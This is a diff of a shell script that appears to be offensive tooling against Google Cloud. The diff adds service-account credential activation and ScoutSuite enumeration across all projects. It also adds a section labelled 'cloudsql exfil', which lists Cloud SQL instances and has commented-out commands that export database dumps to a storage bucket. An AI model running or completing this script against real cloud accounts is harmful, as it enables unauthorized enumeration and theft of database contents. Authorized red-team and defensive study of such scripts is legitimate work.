@@ -19,16 +19,23 @@ log "public ip: $(curl -s https://icanhazip.com)"
 # gcp cred setup
 #######################
 
-# TBD
+
+export GOOGLE_APPLICATION_CREDENTIALS=~/.config/gcloud/credentials.json
+gcloud auth activate-service-account --key-file ~/.config/gcloud/credentials.json
 
 #######################
 # cloud enumeration
 #######################
-scout gcp --service-account ~/.config/gcloud/credentials.json --report-dir /root/scout-report --no-browser 2>&1 | tee -a $LOGFILE 
+scout gcp --service-account ~/.config/gcloud/credentials.json --report-dir /$SCRIPTNAME/scout-report --all-projects --no-browser 2>&1 | tee -a $LOGFILE 
 
 
 #######################
 # cloudsql exfil snapshot and export
 #######################
 
-touch "/tmp/$SCRIPTNAME"
+gcloud sql instances list
+# gcloud storage ls
+# gcloud sql instances describe
+# gcloud sql export sql INSTANCE_NAME gs://BUCKET_NAME/sqldumpfile.gz \
+# --database=DATABASE_NAME \
+# --offload
